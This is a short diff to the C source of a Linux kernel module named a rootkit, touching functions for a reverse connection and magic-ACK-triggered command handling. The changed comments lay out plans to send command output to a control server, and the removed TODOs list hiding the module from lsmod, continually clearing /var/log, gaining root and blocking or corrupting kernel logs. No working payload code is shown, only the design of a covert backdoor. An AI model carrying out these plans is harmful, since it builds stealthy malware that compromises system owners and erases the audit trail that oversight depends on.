@@ -310,9 +310,11 @@ void reverse_connect(void)
 }
 
 
-/* Up to 14 (or more) different commands. */
-/* Most of these will require, at the very least, 'sudo'. */
-/* Recommended that user gets root privileges first. */
+/**
+ * TODO:
+ *   - Contents of each command-file should be placed
+ *     in a buffer, then sent to the control server.
+**/
 void handle_command(unsigned long int ack_seq)
 {
 	// argv[0] reserved for user program.	
@@ -645,22 +647,9 @@ void test(void)
 
 /**
  * TODO:
- *   - Hide the module:
- *     + Option1:  Overwrite "lsmod"
- *     + Option2:  Delete module listing "rootkit" from modules. <-- Easy option.
- *     + Do this last (for the sake of debugging).
- *   - Clear /var/log/ user messages continually with every packet received.
  *   - Seed for randomly generated magic "ACK"s?
  *   - Persistence (try connect on startup?)
- *   - Execute userspace commands and send output to file.
- *     + Grab file output with filp_open, place in buffer. 
- *     + Send the buffer.
- *   - Get TCP buffer in working condition.
- *   - Make a 'Dig-In' function:
- *     + Gets root privileges.
- *     + Prevents read operations on kernel logs.
- *     AND/OR
- *     + Forcefully corrupt the kernel logs? 
+ *   - Get TCP connection in working condition. 
 **/
 int start(void)
 {
